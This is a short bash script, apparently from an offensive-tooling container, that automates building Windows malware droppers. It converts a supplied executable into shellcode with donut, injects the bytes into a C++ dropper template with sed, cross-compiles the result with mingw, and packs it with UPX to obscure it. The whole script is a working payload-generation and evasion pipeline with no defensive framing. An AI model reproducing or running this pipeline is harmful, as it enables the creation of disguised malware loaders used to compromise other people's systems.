#!/bin/bash

# Everything here gets run inside the container

# get an executable from /input (grabs the most recent)
EXE=$(cd /root/costume_world/input && ls -t *.exe | head -n 1)

# get a pseudorandom number to avoid file conflicts
RAND_SUFFIX=$RANDOM

# generate shellcode
echo
echo "[*] Generating shellcode with donut"
echo

/opt/donut/donut -a 2 -f 3 -o /root/costume_world/output/shellcode_${RAND_SUFFIX}.txt /root/costume_world/input/${EXE}

# extract the lines containing bytes
tail -n +2 /root/costume_world/output/shellcode_${RAND_SUFFIX}.txt | head -n -1 > /root/costume_world/output/shellcode_trimmed_${RAND_SUFFIX}.txt

# get the position of the byte array in the dropper template
INSERT_PAYLOAD_AT_LINE=$(grep -n "unsigned char payload" /root/costume_world/dropper_base.cpp | cut -d \: -f 1)

# get the length of the shellcode (assumes 16 bytes per line)
let "NUM_BYTES = 16 * $(wc -l /root/costume_world/output/shellcode_trimmed_${RAND_SUFFIX}.txt | cut -d ' ' -f 1)"

# insert the shellcode and its length into the dropper template
sed -e "${INSERT_PAYLOAD_AT_LINE}r /root/costume_world/output/shellcode_trimmed_${RAND_SUFFIX}.txt" -e "s/payload_len \= 0/payload_len \= ${NUM_BYTES}/g" /root/costume_world/dropper_base.cpp > /root/costume_world/output/dropper_mod_${RAND_SUFFIX}.cpp

# compile the dropper
echo
echo "[*] Compiling the dropper"
echo

x86_64-w64-mingw32-c++ -o /root/costume_world/output/dropper_${RAND_SUFFIX}.exe -static-libgcc -static-libstdc++ /root/costume_world/output/dropper_mod_${RAND_SUFFIX}.cpp

# pack the dropper
echo
echo "[*] Packing the dropper"
echo

upx --ultra-brute /root/costume_world/output/dropper_${RAND_SUFFIX}.exe -o /root/costume_world/output/dropper_packed_${RAND_SUFFIX}.exe
